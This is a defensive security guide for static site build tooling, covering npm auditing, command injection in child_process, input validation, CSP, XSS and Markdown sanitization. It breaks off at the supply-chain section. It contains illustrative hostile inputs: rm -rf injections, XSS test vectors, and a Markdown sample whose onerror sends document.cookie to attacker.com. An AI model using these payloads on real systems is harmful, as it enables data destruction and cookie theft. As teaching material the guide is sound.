# Static Site Security Best Practices Report
## November 30, 2025

### Executive Summary

This report provides comprehensive security guidance for static site generators and build tooling based on current 2024-2025 best practices. It covers dependency security, build script safety, content security policies, XSS prevention, markdown rendering security, and supply chain protection. The recommendations are informed by recent security incidents including the Shai-Hulud worm attack (September 2025) which compromised 18 widely-used npm packages with over 2.6 billion weekly downloads.

---

## 1. Dependency Security and npm Audit Practices

### Overview

npm audit is a critical tool for identifying known vulnerabilities in project dependencies. However, it has limitations and should be part of a comprehensive security strategy rather than the sole defense mechanism.

### Core npm Audit Commands

- `npm audit` - Audit dependencies for known vulnerabilities
- `npm audit fix` - Automatically install compatible security updates
- `npm audit signatures` - Verify package signatures (npm v9+)
- `npm ci` - Install exact versions from lockfile (preferred for production)

### Best Practices

#### 1. Use npm ci in Production Environments

Always use `npm ci` instead of `npm install` in CI/CD pipelines and production deployments. This ensures:
- Deterministic installations across different environments
- Enforced dependency expectations across team collaboration
- Prevention of unexpected version changes that could introduce vulnerabilities

**Implementation:**
```bash
# In CI/CD pipelines
npm ci --only=production

# Avoid in production
npm install  # Can install different versions than lockfile
```

#### 2. Integrate Regular Audits into CI/CD

Embed security audits into your continuous integration workflow to catch vulnerabilities early:

```yaml
# Example GitHub Actions workflow
- name: Security Audit
  run: npm audit --audit-level=high
```

**Audit Levels:**
- `low` - All vulnerabilities
- `moderate` - Moderate and above
- `high` - High and critical only
- `critical` - Critical only

#### 3. Handle npm audit fix Carefully

When running `npm audit fix`:
- Review changes before committing
- Test thoroughly after updates
- Understand that some vulnerabilities cannot be auto-fixed
- Be cautious with `npm audit fix --force` as it may introduce breaking changes

**Important Note:** `npm audit fix` analyzes both `package.json` and `package-lock.json`, scanning all dependencies including sub-dependencies. It uses semantic versioning constraints to automatically resolve issues where possible.

#### 4. Dependency Update Strategy

- **Schedule periodic updates** - Don't wait for vulnerabilities; stay current
- **Review release notes** - Understand what changed before upgrading
- **Use semantic versioning carefully** - `^` allows minor/patch updates, `~` allows patch only
- **Avoid both extremes** - Neither constant bleeding-edge upgrades nor long-term stagnation

#### 5. Lock File Management

**Critical Security Practice:** Properly manage lock files to prevent supply chain attacks.

```json
// package.json - Add this to .npmrc for team consistency
{
  "engines": {
    "npm": ">=8.0.0"
  }
}
```

**Lock File Security:**
- Lock files prevent unexpected version changes via MITM attacks
- They include integrity checksums (SHA-512) for each package
- Inconsistencies between `package.json` and lockfile can be hazardous
- Never commit lockfile inconsistencies without investigation

**Common Issue:** NPM has known issues with lock file integrity changes across different:
- Operating systems
- npm versions
- Node.js versions

**Solution:** Standardize development environments using `.nvmrc` or `mise.toml`.

#### 6. Handle Outdated and Unmaintained Packages

When a package no longer receives security updates:

```json
// Use overrides in package.json (npm 8.3+)
{
  "overrides": {
    "vulnerable-package": "^3.0.0"
  }
}
```

**Alternative strategies:**
- Switch to well-maintained alternatives
- Fork and maintain internally if necessary
- Use tools like `npm-check-updates` to identify outdated dependencies

#### 7. Monitor Security Advisories

- Subscribe to npm security advisories
- Enable GitHub Dependabot for automatic security updates
- Use tools like Snyk or Socket.dev for real-time monitoring
- Configure notifications for new CVEs affecting your dependencies

#### 8. Additional Security Tools

Beyond npm audit, consider:

- **Snyk** - Comprehensive vulnerability scanning with IDE integration
- **Socket.dev** - Supply chain attack detection
- **OWASP Dependency-Track** - CVE monitoring and SBOM management
- **npm-audit-resolver** - Manage false positives and audit results

#### 9. Verify Package Provenance (2025 Update)

npm now supports provenance attestations:
- Publicly links packages to source code and build instructions
- Signed by Sigstore public good servers
- Logged in public transparency ledger
- Allows verification of package origin before download

**Publishing with provenance:**
```bash
npm publish --provenance
```

#### 10. NPM Token Security (2025 Update)

**Important:** Legacy npm tokens were sunset at the end of 2025. Use Granular Access Tokens:

- Create tokens with minimal required permissions
- Use read-only tokens where possible
- Implement IP restrictions
- Rotate tokens regularly
- Never commit tokens to repositories

### Limitations to Understand

npm audit has important limitations:
- **Only catches known vulnerabilities** - Misses zero-days
- **No malware detection** - Cannot detect malicious code in legitimate-looking packages
- **Shallow dependency analysis** - May miss deeply nested transitive dependencies
- **False sense of security** - "You think your app uses 40 packages. In reality, it depends on 600."

**Defense in Depth:** Use multiple complementary tools and strategies.

---

## 2. execSync/child_process Security Concerns

### Critical Vulnerabilities (2024-2025)

#### CVE-2024-27980 (High Severity)

**Description:** Command injection vulnerability via `args` parameter of `child_process.spawn` without shell option on Windows.

**Affected Versions:** All Windows users in active release lines (18.x, 20.x, 21.x)

**Impact:** An incomplete fix for the "BatBadBut" vulnerability that arises from improper handling of batch files with all possible extensions on Windows.

**Breaking Change:** Node.js now errors with `EINVAL` if a `.bat` or `.cmd` file is passed to `spawn`/`spawnSync` without the `shell` option set. If input is sanitized, you can use `{ shell: true }` to prevent errors.

**CRITICAL WARNING:** Do not use `--security-revert=CVE-2024-27980` to bypass this fix. It is strongly advised against.

### Command Injection Attack Vectors

Command injection vulnerabilities manifest when untrusted user input is sent to an interpreter as part of a command or query. Attackers can:

- Execute arbitrary commands on the host OS
- Read restricted file contents
- Install malware
- Take full control of the server

**Common Attack Patterns:**
```javascript
// DANGEROUS - User input in exec
const { exec } = require('child_process');
const userInput = req.query.filename; // e.g., "file.txt; rm -rf /"
exec(`cat ${userInput}`, callback); // VULNERABLE!

// Attack chains using: ; & | || $() < > >>
```

### Secure Alternatives and Best Practices

#### 1. Use execFile Instead of exec/execSync

**Recommended Approach:**
```javascript
const { execFile } = require('child_process');

// SAFE - execFile does not spawn a shell
execFile('ls', ['-lh', userProvidedPath], (error, stdout) => {
  if (error) {
    console.error('Error:', error);
    return;
  }
  console.log(stdout);
});
```

`execFile` helps prevent arbitrary shell commands from being executed and is the recommended defense.

#### 2. Use spawn with Arguments Array

```javascript
const { spawn } = require('child_process');

// SAFE - Arguments passed as array, not string
const child = spawn('grep', [userInput], {
  cwd: '/safe/directory',
  env: { PATH: '/usr/bin' } // Restricted PATH
});
```

#### 3. Never Pass Unsanitized Input to exec/execSync

```javascript
// DANGEROUS
const { execSync } = require('child_process');
execSync(`git commit -m "${userMessage}"`); // VULNERABLE!

// BETTER - But still risky
const { execFileSync } = require('child_process');
execFileSync('git', ['commit', '-m', userMessage]);
```

#### 4. Input Validation and Allowlisting

**Use strict allowlisting:**
```javascript
function validateFilename(filename) {
  // Only allow alphanumeric, dash, underscore, dot
  if (!/^[a-zA-Z0-9._-]+$/.test(filename)) {
    throw new Error('Invalid filename');
  }
  return filename;
}

const safeFilename = validateFilename(userInput);
execFile('cat', [safeFilename], callback);
```

#### 5. Avoid Shell Invocation

```javascript
// BAD - Shell is spawned
exec('ls -la', callback);

// GOOD - No shell spawned
execFile('ls', ['-la'], callback);

// BAD - Shell option enabled
spawn('ls', ['-la'], { shell: true });

// GOOD - No shell
spawn('ls', ['-la']);
```

#### 6. Proper Quote Escaping (If Shell Is Unavoidable)

**Note:** Wrapping in single quotes is NOT sufficient protection. Node.js lacks proper shell-escaping mechanisms.

```javascript
// STILL VULNERABLE
exec(`cat '${userInput}'`); // Can be bypassed with: file.txt' ; rm -rf / ; echo '

// If you must use shell, consider shell-escape library
const shellescape = require('shell-escape');
const escaped = shellescape([userInput]);
exec(`cat ${escaped}`, callback);
```

### ESLint Security Rules

Enable security linting to catch dangerous patterns:

```javascript
// .eslintrc.js
module.exports = {
  plugins: ['security'],
  rules: {
    'security/detect-child-process': 'error',
    'security/detect-non-literal-fs-filename': 'error'
  }
};
```

### Build Script Security Checklist

For static site generators and build tools:

- [ ] Never use `exec`/`execSync` with user input or environment variables
- [ ] Prefer `execFile`/`spawn` with argument arrays
- [ ] Validate all inputs with strict allowlisting
- [ ] Use minimal permissions and restricted environments
- [ ] Audit third-party build plugins that execute commands
- [ ] Review all `package.json` scripts for command injection risks
- [ ] Never trust data from external sources (API responses, file contents)
- [ ] Use `--ignore-scripts` flag when installing untrusted dependencies

---

## 3. Input Validation in Build Scripts

### Core Principles

Input validation should be part of a defense-in-depth strategy, serving as one layer among others such as parameterized statements and output encoding.

### Best Practices for Build Scripts

#### 1. Client and Server-Side Validation

While build scripts don't have traditional "client/server," apply this principle:
- **Configuration validation** - At script startup, validate all config inputs
- **Runtime validation** - Validate data as soon as it enters the system

```javascript
// Build script example
import Joi from 'joi';

const configSchema = Joi.object({
  outputDir: Joi.string().pattern(/^[a-zA-Z0-9/_-]+$/).required(),
  baseUrl: Joi.string().uri().required(),
  enableAnalytics: Joi.boolean().default(false)
});

const { error, value: config } = configSchema.validate(process.env);
if (error) {
  throw new Error(`Invalid configuration: ${error.message}`);
}
```

#### 2. Allowlisting Over Denylisting

**Allowlisting** (defining exactly what IS authorized) is far superior to denylisting (blocking known-bad patterns).

**Why denylisting fails:**
```javascript
// DANGEROUS - Easily bypassed
function denylistValidation(input) {
  if (input.includes("'") || input.includes('<script>')) {
    throw new Error('Invalid input');
  }
  return input; // Still vulnerable to: <img src=x onerror=alert(1)>
}

// BETTER - Allowlist approach
function allowlistValidation(input) {
  if (!/^[a-zA-Z0-9-_]+$/.test(input)) {
    throw new Error('Input contains invalid characters');
  }
  return input;
}
```

**Use allowlisting for:**
- File paths and names
- Configuration values
- User-provided identifiers
- Command-line arguments

#### 3. Centralize Validation Logic

Create reusable validation functions:

```javascript
// validators.js
export const validators = {
  isValidPath(path) {
    // No directory traversal
    if (path.includes('..') || path.startsWith('/')) {
      return false;
    }
    // Only safe characters
    return /^[a-zA-Z0-9/_.-]+$/.test(path);
  },

  isValidSlug(slug) {
    return /^[a-z0-9-]+$/.test(slug);
  },

  isValidUrl(url) {
    try {
      const parsed = new URL(url);
      return ['http:', 'https:'].includes(parsed.protocol);
    } catch {
      return false;
    }
  }
};

// Use in build scripts
import { validators } from './validators.js';

if (!validators.isValidPath(outputPath)) {
  throw new Error('Invalid output path');
}
```

#### 4. Schema Validation

Use JSON schema validation for structured data:

```javascript
import Ajv from 'ajv';

const ajv = new Ajv();

const schema = {
  type: 'object',
  properties: {
    title: { type: 'string', maxLength: 100 },
    slug: { type: 'string', pattern: '^[a-z0-9-]+$' },
    publishDate: { type: 'string', format: 'date' }
  },
  required: ['title', 'slug'],
  additionalProperties: false // Reject unknown properties
};

const validate = ajv.compile(schema);

function validateFrontmatter(data) {
  if (!validate(data)) {
    throw new Error(`Invalid frontmatter: ${ajv.errorsText(validate.errors)}`);
  }
  return data;
}
```

#### 5. File System Safety

**Critical for build scripts:**

```javascript
import path from 'path';
import fs from 'fs/promises';

async function safeReadFile(userPath, baseDir) {
  // Resolve to absolute path
  const resolvedPath = path.resolve(baseDir, userPath);

  // Ensure path is within baseDir (prevent directory traversal)
  if (!resolvedPath.startsWith(baseDir)) {
    throw new Error('Path traversal attempt detected');
  }

  // Verify file exists and is a file (not directory/symlink)
  const stats = await fs.stat(resolvedPath);
  if (!stats.isFile()) {
    throw new Error('Not a regular file');
  }

  return fs.readFile(resolvedPath, 'utf-8');
}
```

#### 6. Environment Variable Validation

```javascript
// Validate required environment variables
const requiredEnvVars = ['NODE_ENV', 'BASE_URL'];

for (const varName of requiredEnvVars) {
  if (!process.env[varName]) {
    throw new Error(`Missing required environment variable: ${varName}`);
  }
}

// Validate values
const validNodeEnvs = ['development', 'production', 'test'];
if (!validNodeEnvs.includes(process.env.NODE_ENV)) {
  throw new Error(`Invalid NODE_ENV: ${process.env.NODE_ENV}`);
}
```

#### 7. Static Code Analysis

Use static analysis tools to detect security issues:

```json
// package.json
{
  "scripts": {
    "lint:security": "eslint --plugin security .",
    "prebuild": "npm run lint:security"
  },
  "devDependencies": {
    "eslint-plugin-security": "^2.1.0"
  }
}
```

**Recommended tools:**
- **ESLint with security plugins** - Detect common patterns
- **Semgrep** - Custom security rules
- **CodeQL** - Advanced static analysis
- **Checkmarx/Fortify** - Enterprise SAST tools

### Attacks Prevented by Proper Input Validation

When implemented correctly, input validation provides immunity from:
- Cross-site scripting (XSS)
- Response splitting
- Buffer overflows
- Data injection attacks
- Directory traversal attacks
- Denial-of-service (DoS)

---

## 4. Content Security Policy for Static Sites

### Overview

Content Security Policy (CSP) provides defense-in-depth by serving as an effective second layer of protection against XSS and other vulnerabilities. For static sites, CSP implementation differs from dynamic applications.

### Hash-Based CSP for Static Sites

**Recommended approach for static content:**

Hash-based CSP works best when content never changes. Unlike nonces, both the CSP and content can be static because hashes stay the same.

**How it works:**
1. Compute SHA-256 hash of each inline script
2. Add hashes to CSP header
3. Browser verifies script content matches hash before execution

**Example:**
```html
<!-- index.html -->
<script>
  console.log('Hello, world!');
</script>
```

**Generate hash:**
```bash
echo -n "console.log('Hello, world!');" | openssl dgst -sha256 -binary | openssl base64
# Output: qznLcsROx4GACP2dm0UCKCzCG+HiZ1guq6ZZDob/Tng=
```

**CSP header:**
```
Content-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG+HiZ1guq6ZZDob/Tng='
```

**Important:** Hashes are fragile. Changing anything inside the script tag (even whitespace) breaks the hash.

### Nonce-Based CSP (Not Ideal for Static Sites)

Nonce-based CSP requires server-side generation of unique random values per request. This means:
- Server cannot serve static HTML
- Requires templating engine to insert nonces
- Not suitable for pure static site deployments (CDN, S3, etc.)

**When to use nonces:** Server-side rendered or edge-rendered static sites (Cloudflare Workers, Netlify Edge Functions).

### Strict CSP Best Practices (2025)

Modern CSP emphasizes "strict" policies using nonces or hashes rather than legacy domain allowlisting.

**Recommended strict policy:**
```
Content-Security-Policy:
  script-src 'sha256-{HASH}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  require-trusted-types-for 'script';
```

**Key directives:**

- **`'strict-dynamic'`** - Allows scripts loaded by trusted scripts (solves third-party script loading)
- **`object-src 'none'`** - Blocks Flash and other plugins
- **`base-uri 'none'`** - Prevents base tag injection
- **`require-trusted-types-for 'script'`** - Enforces Trusted Types API

### Implementation Methods for Static Sites

#### Method 1: HTTP Headers (Preferred)

Configure at CDN/hosting level:

**Netlify (_headers file):**
```
/*
  Content-Security-Policy: script-src 'sha256-ABC123...' 'sha256-DEF456...'; object-src 'none'; base-uri 'none'
```

**Cloudflare Pages (_headers):**
```
/*
  Content-Security-Policy: script-src 'sha256-ABC123...' 'strict-dynamic'; object-src 'none'
```

**GitHub Pages (not supported)** - Use meta tag instead.

#### Method 2: Meta Tags (Limited Features)

```html
<meta http-equiv="Content-Security-Policy"
      content="script-src 'sha256-ABC123...'; object-src 'none'">
```

**Limitations of meta tags:**
- No `frame-ancestors` support
- No `sandbox` support
- No reporting endpoints
- Processed after HTML parsing begins

**When to use:** Client-side rendered SPAs with only static resources, or platforms without header control.

#### Method 3: Automated Hash Generation

Build-time hash injection for static sites:

```javascript
// build-csp.js
import crypto from 'crypto';
import fs from 'fs/promises';
import { parse } from 'node-html-parser';

async function generateCSP(htmlPath) {
  const html = await fs.readFile(htmlPath, 'utf-8');
  const root = parse(html);

  const scriptHashes = root.querySelectorAll('script')
    .filter(script => !script.getAttribute('src')) // Only inline scripts
    .map(script => {
      const content = script.textContent;
      const hash = crypto.createHash('sha256')
        .update(content, 'utf-8')
        .digest('base64');
      return `'sha256-${hash}'`;
    });

  const csp = `script-src ${scriptHashes.join(' ')} 'strict-dynamic'; object-src 'none'; base-uri 'none'`;

  return csp;
}
```

### Subresource Integrity (SRI) for Static Sites

Even fully static sites benefit from CSP for enforcing Subresource Integrity on third-party resources:

```html
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
  crossorigin="anonymous">
</script>
```

**CSP enforcement:**
```
Content-Security-Policy: require-sri-for script style;
```

**Note:** `require-sri-for` is deprecated in favor of `require-trusted-types-for`, but still supported.

### Report-Only Mode

Test CSP without breaking functionality:

```
Content-Security-Policy-Report-Only: script-src 'sha256-ABC...'; report-uri /csp-report
```

**Benefits:**
- Identify violations before enforcement
- Monitor third-party script behavior
- Gradual CSP deployment

### Legacy Header Deprecation

**DO NOT USE:**
- `X-Content-Security-Policy` (obsolete)
- `X-WebKit-CSP` (obsolete)

These have limited implementations and are no longer maintained.

### CSP for Static Site Generators

**Astro example:**
```javascript
// astro.config.mjs
export default {
  vite: {
    plugins: [
      {
        name: 'csp-hash-generator',
        transformIndexHtml(html) {
          // Generate hashes and inject CSP meta tag
        }
      }
    ]
  }
};
```

**Eleventy example:**
```javascript
// .eleventy.js
module.exports = function(eleventyConfig) {
  eleventyConfig.addTransform('csp', async (content, outputPath) => {
    if (outputPath.endsWith('.html')) {
      // Calculate hashes and inject CSP
    }
    return content;
  });
};
```

### Important Limitations

CSP is defense-in-depth, not a replacement for secure development:
- Won't fix XSS vulnerabilities
- Mitigates exploitation, doesn't prevent bugs
- Requires proper output encoding and input validation
- Only works on browsers that support CSP

---

## 5. XSS Prevention in Static Sites

### Overview

Cross-Site Scripting (XSS) remains a critical threat in 2025, evolving with advanced techniques and AI integration. Static sites are NOT immune to XSS - DOM-based XSS attacks are still possible through JavaScript execution.

### XSS in Static Sites: The Reality

**Common misconception:** "Static sites can't have XSS because there's no server-side rendering."

**Reality:** XSS is absolutely possible on static sites using DOM-based attacks:

```javascript
// VULNERABLE static site code
const params = new URLSearchParams(window.location.search);
const username = params.get('name');
document.getElementById('greeting').innerHTML = `Hello, ${username}!`;

// Attack: https://example.com/?name=<img src=x onerror=alert(1)>
```

### Types of XSS in Static Sites

#### 1. DOM-Based XSS

JavaScript directly manipulates the DOM with untrusted data:

```javascript
// VULNERABLE
element.innerHTML = userInput;
document.write(userInput);
eval(userInput);
location.href = userInput;

// SAFE
element.textContent = userInput; // Treats as text, not HTML
element.setAttribute('data-value', userInput);
```

#### 2. Third-Party Script XSS

Compromised CDN or third-party scripts:

```html
<!-- If cdn.example.com is compromised, your site is vulnerable -->
<script src="https://cdn.example.com/analytics.js"></script>
```

**Mitigation:** Use Subresource Integrity (SRI) - see Section 6.

#### 3. Client-Side Template Injection

Static site generators using client-side templating:

```javascript
// VULNERABLE - Client-side Markdown/template rendering
const markdown = params.get('content');
const html = markdownToHtml(markdown); // If not sanitized
container.innerHTML = html;
```

### XSS Prevention Best Practices

#### 1. Use Safe DOM APIs

**Prefer safe sinks:**
```javascript
// SAFE APIs
element.textContent = userInput;      // Always safe
element.setAttribute('name', value);  // Safe for most attributes
element.className = userInput;        // Safe
element.value = userInput;            // Safe for form inputs

// UNSAFE APIs - Avoid or sanitize first
element.innerHTML = userInput;        // DANGEROUS
element.outerHTML = userInput;        // DANGEROUS
document.write(userInput);            // DANGEROUS
element.insertAdjacentHTML('beforeend', userInput); // DANGEROUS
```

#### 2. Context-Aware Output Encoding

Different contexts require different encoding:

**HTML Context:**
```javascript
function encodeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// Usage
element.innerHTML = `<div>${encodeHTML(userInput)}</div>`;
```

**JavaScript Context:**
```javascript
// Only in quoted strings!
function encodeJS(str) {
  return str.replace(/[\u0000-\u001F\u007F-\u009F]/g, (char) => {
    return '\\u' + ('0000' + char.charCodeAt(0).toString(16)).slice(-4);
  });
}

// Usage
const script = `const name = "${encodeJS(userInput)}";`;
```

**URL Context:**
```javascript
// For URL parameters only
const encoded = encodeURIComponent(userInput);
const url = `https://example.com/search?q=${encoded}`;
```

**CSS Context:**
```javascript
// Only in property values, use hex encoding
function encodeCSS(str) {
  return str.replace(/[^a-zA-Z0-9]/g, (char) => {
    return '\\' + char.charCodeAt(0).toString(16) + ' ';
  });
}
```

#### 3. Leverage Framework Protections

Modern frameworks provide built-in XSS protection:

**React:**
```jsx
// SAFE - React auto-escapes
<div>{userInput}</div>

// DANGEROUS - Bypasses protection
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

**Vue:**
```vue
<!-- SAFE - Vue auto-escapes -->
<div>{{ userInput }}</div>

<!-- DANGEROUS - Renders raw HTML -->
<div v-html="userInput"></div>
```

**Svelte:**
```svelte
<!-- SAFE -->
<div>{userInput}</div>

<!-- DANGEROUS -->
<div>{@html userInput}</div>
```

**Framework limitations:** No framework is perfect. Security gaps exist even in React and Angular. Never rely solely on framework protection.

#### 4. HTML Sanitization

When you must allow HTML input (e.g., rich text editors):

```javascript
import DOMPurify from 'dompurify';

// SAFE - DOMPurify removes malicious code
const dirty = '<img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(dirty);
element.innerHTML = clean; // Safe

// Configure for specific needs
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});
```

**Critical:** Sanitize at the point of rendering, not just on form submission. If HTML is modified after sanitization, it may no longer be safe.

#### 5. Content Security Policy

Implement strict CSP as additional layer (see Section 4):

```
Content-Security-Policy:
  script-src 'self' 'sha256-...';
  object-src 'none';
  base-uri 'none';
```

CSP aims to mitigate XSS impact. If an XSS vulnerability exists, CSP can hinder or prevent exploitation.

#### 6. Avoid Dangerous Patterns

**Never do this:**
```javascript
// NEVER use eval with user input
eval(userInput);

// NEVER use Function constructor with user input
new Function(userInput)();

// NEVER use setTimeout/setInterval with strings
setTimeout(userInput, 1000);

// NEVER use document.write
document.write(userInput);

// NEVER use location.href with unvalidated input
location.href = userInput; // Can be javascript: URL
```

**Safe alternatives:**
```javascript
// Instead of location.href = userInput
const url = new URL(userInput, window.location.origin);
if (url.protocol === 'http:' || url.protocol === 'https:') {
  location.href = url.href;
}
```

### Static Site Generator Specific Guidance

#### Build-Time XSS Prevention

Even build scripts can introduce XSS:

```javascript
// VULNERABLE build script
const title = frontmatter.title;
const html = `<title>${title}</title>`; // If title is malicious

// SAFE build script
import { escape } from 'html-escaper';
const html = `<title>${escape(frontmatter.title)}</title>`;
```

#### Markdown Rendering Security

See Section 6 for detailed guidance on secure Markdown rendering.

### Testing for XSS

**Static analysis:**
```bash
npm install --save-dev eslint eslint-plugin-no-unsanitized

# .eslintrc.js
{
  "plugins": ["no-unsanitized"],
  "rules": {
    "no-unsanitized/method": "error",
    "no-unsanitized/property": "error"
  }
}
```

**Manual testing payloads:**
```javascript
// Common XSS test vectors
const testVectors = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  'javascript:alert(1)',
  '<svg onload=alert(1)>',
  '"><script>alert(1)</script>',
  "'-alert(1)-'",
  '<iframe src="javascript:alert(1)">',
];
```

### AI-Enhanced XSS (2025 Trends)

Modern XSS attacks increasingly use:
- AI-powered payload generation
- Mutation-based evasion techniques
- Context-aware exploitation
- Automated vulnerability discovery

**Defense:** Combine multiple layers - input validation, output encoding, CSP, and continuous security testing.

---

## 6. Secure Handling of External Content (Markdown Rendering)

### Overview

Markdown may seem safe due to its plain text formatting, but naive implementations can lead to severe XSS vulnerabilities. When Markdown is converted to HTML, there's risk of malicious code execution if it includes embedded HTML or JavaScript.

### The Markdown Security Challenge

**Key insight:** Showing user-generated content to other users always carries risk. Markdown is no exception.

**Vulnerability example:**
```markdown
# Innocent Looking Title

Click [here](javascript:alert(document.cookie))

<img src=x onerror="fetch('https://attacker.com?cookie='+document.cookie)">

<script>
  // Malicious code
  steal_credentials();
</script>
```

### DOMPurify: The Gold Standard

DOMPurify is a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML, and SVG, developed by Cure53 (reputable security consultancy).

**Current Version:** v3.3.0 (as of 2024)

**Key features:**
- Very simple to use
- Strips everything dangerous from HTML
- Prevents XSS attacks and other nastiness
- Works with a secure default
- Highly configurable with hooks

### Using DOMPurify with Markdown Libraries

#### Marked.js + DOMPurify

The Marked team has stated that sanitization doesn't belong in core Marked (it's not part of Markdown specs).

**Recommended pattern:**
```javascript
import { marked } from 'marked';
import DOMPurify from 'dompurify';

function renderMarkdown(markdown) {
  // Step 1: Convert Markdown to HTML
  const rawHtml = marked.parse(markdown);

  // Step 2: Sanitize HTML
  const cleanHtml = DOMPurify.sanitize(rawHtml);

  // Step 3: Insert into DOM
  element.innerHTML = cleanHtml;
}
```

**Using safe-marked library:**
```javascript
import { SafeMarked } from 'safe-marked';

// Automatically combines marked + DOMPurify
const safeHtml = SafeMarked.parse(markdown);
```

#### markdown-it + DOMPurify

```javascript
import MarkdownIt from 'markdown-it';
import DOMPurify from 'dompurify';

const md = new MarkdownIt({
  html: true, // Allow HTML in Markdown
  linkify: true,
  typographer: true
});

function renderMarkdown(markdown) {
  const rawHtml = md.render(markdown);
  const cleanHtml = DOMPurify.sanitize(rawHtml);
  return cleanHtml;
}
```

#### React + Markdown

```jsx
import React, { useMemo } from 'react';
import { marked } from 'marked';
import DOMPurify from 'dompurify';

function MarkdownContent({ markdown }) {
  const sanitizedHtml = useMemo(() => {
    const rawHtml = marked.parse(markdown);
    return DOMPurify.sanitize(rawHtml);
  }, [markdown]);

  return <div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />;
}
```

**Better: Use react-markdown (no HTML by default):**
```jsx
import ReactMarkdown from 'react-markdown';

function MarkdownContent({ markdown }) {
  return (
    <ReactMarkdown>
      {markdown}
    </ReactMarkdown>
  );
}
```

If HTML is needed:
```jsx
import ReactMarkdown from 'react-markdown';
import rehypeRaw from 'rehype-raw';
import rehypeSanitize from 'rehype-sanitize';

function MarkdownContent({ markdown }) {
  return (
    <ReactMarkdown
      rehypePlugins={[rehypeRaw, rehypeSanitize]}
    >
      {markdown}
    </ReactMarkdown>
  );
}
```

### DOMPurify Configuration

#### Basic Sanitization

```javascript
// Default (secure)
const clean = DOMPurify.sanitize(dirty);

// Remove all HTML tags, keep text only
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: []
});
```

#### Allow Specific Tags and Attributes

```javascript
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'title']
});
```

#### Forbid Specific Tags

```javascript
const clean = DOMPurify.sanitize(dirty, {
  FORBID_TAGS: ['style', 'form', 'input'],
  FORBID_ATTR: ['onerror', 'onload']
});
```

#### Return DOM Instead of String

```javascript
const cleanDOM = DOMPurify.sanitize(dirty, {
  RETURN_DOM: true
});
container.appendChild(cleanDOM);
```

#### Hooks for Custom Processing

```javascript
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  // Force all links to open in new tab
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});

const clean = DOMPurify.sanitize(dirty);
```

### Best Practices for Markdown Rendering

#### 1. Always Sanitize Before DOM Insertion

```javascript
// WRONG - Sanitize too early
const clean = DOMPurify.sanitize(userInput);
// ... later, HTML is modified ...
element.innerHTML = clean; // No longer safe!

// RIGHT - Sanitize just before insertion
const html = processMarkdown(userInput);
const clean = DOMPurify.sanitize(html);
element.innerHTML = clean; // Safe
```

#### 2. Disable HTML in Markdown (If Possible)

Most Markdown libraries allow disabling HTML:

```javascript
// Marked
marked.setOptions({
  mangle: false,
  headerIds: false,
  sanitize: false, // We'll use DOMPurify
  html: false // Disable HTML in Markdown
});

// markdown-it
const md = new MarkdownIt({
  html: false // Disable HTML tags
});
```

#### 3. Combine with Content Security Policy

Layer CSP on top of sanitization:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  object-src 'none';
```

#### 4. Validate Markdown Source

If accepting Markdown from users, validate before storage:

```javascript
function validateMarkdown(markdown) {
  // Check length
  if (markdown.length > 100000) {
    throw new Error('Markdown too long');
  }

  // Check for suspicious patterns
  const suspiciousPatterns = [
    /<script/i,
    /javascript:/i,
    /on\w+=/i, // Event handlers
    /<iframe/i,
    /<object/i,
    /<embed/i
  ];

  for (const pattern of suspiciousPatterns) {
    if (pattern.test(markdown)) {
      // Log for monitoring
      console.warn('Suspicious pattern in Markdown:', pattern);
    }
  }

  return markdown;
}
```

#### 5. Server-Side Sanitization (If Applicable)

For SSG that processes Markdown at build time:

```javascript
// build-time sanitization
import { marked } from 'marked';
import { JSDOM } from 'jsdom';
import createDOMPurify from 'dompurify';

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

export function renderMarkdownSafely(markdown) {
  const rawHtml = marked.parse(markdown);
  return DOMPurify.sanitize(rawHtml);
}
```

### Security Considerations

#### DOM Clobbering

**Real vulnerability from 2024 CTF:**

Even with DOMPurify, DOM clobbering is possible:

```html
<!-- DOMPurify allows id attributes -->
<a id="isSafe"></a>

<script>
// window.isSafe now refers to the <a> element
if (window.isSafe) { // Always true!
  // Execute code
}
</script>
```

**Mitigation:**
```javascript
const clean = DOMPurify.sanitize(dirty, {
  FORBID_ATTR: ['id'] // Remove id attributes if not needed
});
```

#### Link Safety

Sanitize link protocols:

```javascript
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    const href = node.getAttribute('href');
    if (href) {
      try {
        const url = new URL(href, window.location.origin);
        if (!['http:', 'https:', 'mailto:'].includes(url.protocol)) {
          node.removeAttribute('href');
        }
      } catch {
        node.removeAttribute('href');
      }
    }
    // Add security attributes
    node.setAttribute('rel', 'noopener noreferrer');
  }
});
```

### Markdown Rendering Security Checklist

- [ ] Use DOMPurify or equivalent sanitization library
- [ ] Sanitize immediately before DOM insertion
- [ ] Disable HTML in Markdown if possible
- [ ] Configure allowlist of safe tags/attributes
- [ ] Implement CSP as additional layer
- [ ] Add security attributes to links (rel="noopener noreferrer")
- [ ] Validate Markdown length and content
- [ ] Use hooks to enforce security policies
- [ ] Test with known XSS payloads
- [ ] Monitor and log suspicious patterns
- [ ] Keep sanitization library updated

---

## 7. Supply Chain Security for Frontend Projects

### Overview

